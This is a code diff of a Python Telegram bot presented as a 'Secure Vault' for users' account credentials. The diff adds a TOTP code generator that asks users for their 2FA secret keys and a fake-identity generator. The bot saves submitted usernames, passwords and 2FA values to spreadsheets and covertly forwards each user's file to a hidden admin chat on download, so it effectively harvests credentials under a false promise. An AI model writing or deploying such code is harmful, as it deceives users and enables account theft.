@@ -1,6 +1,7 @@
 import os
 import random
 import string
+import pyotp
 from openpyxl import Workbook, load_workbook
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
@@ -9,54 +10,49 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_USERNAME = "@Sefuax"
 
-# Conversation states
+# Conversation states for Submit Account
 USERNAME, PASSWORD, TFA = range(3)
+# Conversation state for 2FA Generator
+WAITING_2FA_SECRET = 10
 
 # ========= KEYBOARD =========
 main_keyboard = ReplyKeyboardMarkup(
     [
         [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
         [KeyboardButton("👤 Admin")],
-        [KeyboardButton("📥 Download")]
+        [KeyboardButton("🔐2FA"), KeyboardButton("📥 Download")]
     ],
     resize_keyboard=True
 )
 
 # ========= HELPER FUNCTIONS =========
 def get_user_excel_file(user_id):
-    """Return filename for specific user"""
     return f"accounts_{user_id}.xlsx"
 
 def save_to_excel(username, password, tfa, user_id):
-    """Save account to user's personal Excel file (only Username, Password, 2FA)"""
     filename = get_user_excel_file(user_id)
-    
     if os.path.exists(filename):
         wb = load_workbook(filename)
         ws = wb.active
     else:
         wb = Workbook()
         ws = wb.active
-        ws.append(["Username", "Password", "2FA"])  # Header row
-    
+        ws.append(["Username", "Password", "2FA"])
     ws.append([username, password, tfa])
     wb.save(filename)
     return True
 
 def get_user_account_count(user_id):
-    """Return number of accounts saved by user"""
     filename = get_user_excel_file(user_id)
     if not os.path.exists(filename):
         return 0
     wb = load_workbook(filename)
     ws = wb.active
-    # Subtract 1 for header row if exists
     count = ws.max_row - 1 if ws.max_row > 1 else 0
     wb.close()
     return max(0, count)
 
 def reset_user_data(user_id):
-    """Delete user's Excel file completely"""
     filename = get_user_excel_file(user_id)
     if os.path.exists(filename):
         os.remove(filename)
@@ -64,23 +60,17 @@ def reset_user_data(user_id):
     return False
 
 def generate_fake_info():
-    """Generate random fake info"""
     first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Sam", "Jamie"]
     last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
-    
     name = f"{random.choice(first_names)} {random.choice(last_names)}"
-    
     base = random.choice(["tech", "coder", "gamer", "hacker", "dev", "pro", "master"])
     num = random.randint(10, 999)
     suffix = random.choice(["x", "z", "q", "v", ""])
     username = f"{base}{num}{suffix}"
-    
     gender = random.choice(["Male", "Female", "Non-binary", "Prefer not to say"])
-    
     return name, username, gender
 
 async def send_to_admin(app, message_text, file_path=None, user_id=None):
-    """Send message or file to admin"""
     admin_chat_id = os.getenv("ADMIN_CHAT_ID")
     if not admin_chat_id:
         return
@@ -98,16 +88,17 @@ async def send_to_admin(app, message_text, file_path=None, user_id=None):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_msg = (
         "🤖 *Welcome to Secure Vault Bot* 🤖\n\n"
-        "I help you store and manage your account credentials securely.\n\n"
+        "I help you store and manage your account credentials.\n\n"
         "✅ *Submit Account* - Store username/password/2FA\n"
         "🎭 *Fake Info* - Generate fake identity\n"
         "👤 *Admin* - Contact administrator\n"
+        "🔐 *2FA* - Generate a TOTP code from your secret key\n"
         "📥 *Download* - Get your saved accounts\n\n"
         "🚀 *Start by submitting your first account!*"
     )
     await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard)
 
-# --- Submit Account Conversation ---
+# --- Submit Account Conversation (unchanged) ---
 async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username*:", parse_mode="Markdown")
     return USERNAME
@@ -126,13 +117,10 @@ async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tfa = update.message.text
     if tfa.lower() == 'none':
         tfa = "Not provided"
-    
     user_id = update.effective_user.id
     username = context.user_data['username']
     password = context.user_data['password']
-    
     save_to_excel(username, password, tfa, user_id)
-    
     await update.message.reply_text(
         "✅ *Account saved successfully!*\n\n"
         f"📝 Username: `{username}`\n"
@@ -142,16 +130,14 @@ async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown",
         reply_markup=main_keyboard
     )
-    
-    # Silent admin notification
     await send_to_admin(
         context.application,
         f"🆕 New account submitted!\n👤 User ID: {user_id}\n📝 Username: {username}",
         user_id=user_id
     )
-    
     return ConversationHandler.END
 
+# --- Fake Info ---
 async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name, username, gender = generate_fake_info()
     fake_msg = (
@@ -163,6 +149,7 @@ async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(fake_msg, parse_mode="Markdown", reply_markup=main_keyboard)
 
+# --- Admin Contact ---
 async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = (
@@ -172,16 +159,58 @@ async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📬 Click here to contact admin: {ADMIN_USERNAME}"
     )
     await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_keyboard)
-    
     await send_to_admin(
         context.application,
         f"🔔 User {user.first_name} (@{user.username or 'no username'}) opened admin panel.\nUser ID: {user.id}",
         user_id=user.id
     )
 
-# --- Download with Inline Buttons ---
+# --- 2FA Generator (TOTP) ---
+async def twofa_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Ask user for the 2FA secret key"""
+    await update.message.reply_text(
+        "🔐 *Two-Factor Authentication (TOTP)*\n\n"
+        "Please send your **2FA secret key** (Base32 format, e.g., `JBSWY3DPEHPK3PXP`).\n\n"
+        "Type `/cancel` to abort.",
+        parse_mode="Markdown"
+    )
+    return WAITING_2FA_SECRET
+
+async def generate_totp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Generate TOTP code from the provided secret"""
+    secret = update.message.text.strip()
+    if not secret:
+        await update.message.reply_text("❌ Invalid secret. Please send a non-empty key.")
+        return WAITING_2FA_SECRET
+    try:
+        # Try to create TOTP object. If secret is invalid, it will raise an exception later.
+        totp = pyotp.TOTP(secret)
+        current_code = totp.now()
+        await update.message.reply_text(
+            f"🔐 *Your 6-digit code:* `{current_code}`\n\n"
+            f"✅ Code generated successfully!\n"
+            f"🤖 Bot is restarting session... (Your data is not saved)",
+            parse_mode="Markdown",
+            reply_markup=main_keyboard
+        )
+        # Clear user data (nothing saved) – simulate "restart"
+        if 'twofa_secret' in context.user_data:
+            del context.user_data['twofa_secret']
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Invalid Base32 secret key.\nError: {str(e)}\n\nPlease send a valid secret key (e.g., from Google Authenticator).",
+            parse_mode="Markdown"
+        )
+        return WAITING_2FA_SECRET
+    # End conversation (restart effect)
+    return ConversationHandler.END
+
+async def cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ 2FA generation cancelled.", reply_markup=main_keyboard)
+    return ConversationHandler.END
+
+# --- Download & Reset (unchanged) ---
 async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show inline keyboard for Download or Reset Report"""
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("📎 Download", callback_data="download_file")],
         [InlineKeyboardButton("🔄 Reset Report", callback_data="reset_report")]
@@ -195,7 +224,6 @@ async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    
     user_id = query.from_user.id
     filename = get_user_excel_file(user_id)
     
@@ -206,8 +234,6 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
                 parse_mode="Markdown"
             )
             return
-        
-        # Send file to user
         with open(filename, 'rb') as f:
             await query.message.reply_document(
                 document=f,
@@ -215,8 +241,6 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
                 caption="📊 *Your saved accounts*",
                 parse_mode="Markdown"
             )
-        
-        # Silently send to admin
         admin_chat_id = os.getenv("ADMIN_CHAT_ID")
         if admin_chat_id:
             try:
@@ -229,22 +253,13 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
                     )
             except Exception as e:
                 print(f"Admin backup failed: {e}")
-        
-        await query.edit_message_text(
-            "✅ *File sent!* Check above.",
-            parse_mode="Markdown"
-        )
+        await query.edit_message_text("✅ *File sent!* Check above.", parse_mode="Markdown")
     
     elif query.data == "reset_report":
         count = get_user_account_count(user_id)
         if count == 0:
-            await query.edit_message_text(
-                "ℹ️ *No accounts to reset.*\n\nYou haven't saved any accounts yet.",
-                parse_mode="Markdown"
-            )
+            await query.edit_message_text("ℹ️ *No accounts to reset.*", parse_mode="Markdown")
             return
-        
-        # Ask for confirmation
         confirm_keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("✅ Yes, delete all", callback_data="confirm_reset")],
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel_reset")]
@@ -256,14 +271,12 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
         )
     
     elif query.data == "confirm_reset":
-        user_id = query.from_user.id
         count_before = get_user_account_count(user_id)
         reset_user_data(user_id)
         await query.edit_message_text(
-            f"🗑️ *Reset Complete*\n\nSuccessfully deleted `{count_before}` account(s) from your storage.",
+            f"🗑️ *Reset Complete*\n\nSuccessfully deleted `{count_before}` account(s).",
             parse_mode="Markdown"
         )
-        # Optional: notify admin
         await send_to_admin(
             context.application,
             f"🔄 User {user_id} reset their data. Deleted {count_before} accounts.",
@@ -271,10 +284,7 @@ async def handle_download_callback(update: Update, context: ContextTypes.DEFAULT
         )
     
     elif query.data == "cancel_reset":
-        await query.edit_message_text(
-            "✅ *Reset cancelled.* Your data is safe.",
-            parse_mode="Markdown"
-        )
+        await query.edit_message_text("✅ *Reset cancelled.* Your data is safe.", parse_mode="Markdown")
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled. Use /start to begin again.", reply_markup=main_keyboard)
@@ -288,8 +298,8 @@ def main():
     
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Conversation handler for Submit Account
-    conv_handler = ConversationHandler(
+    # Conversation: Submit Account
+    submit_conv = ConversationHandler(
         entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
         states={
             USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
@@ -299,9 +309,18 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel)],
     )
     
+    # Conversation: 2FA Generator
+    twofa_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex("^🔐2FA$"), twofa_start)],
+        states={
+            WAITING_2FA_SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_totp)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel_2fa)],
+    )
+    
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(conv_handler)
-    app.add_handler(MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start))
+    app.add_handler(submit_conv)
+    app.add_handler(twofa_conv)
     app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info))
     app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_contact))
     app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download_menu))
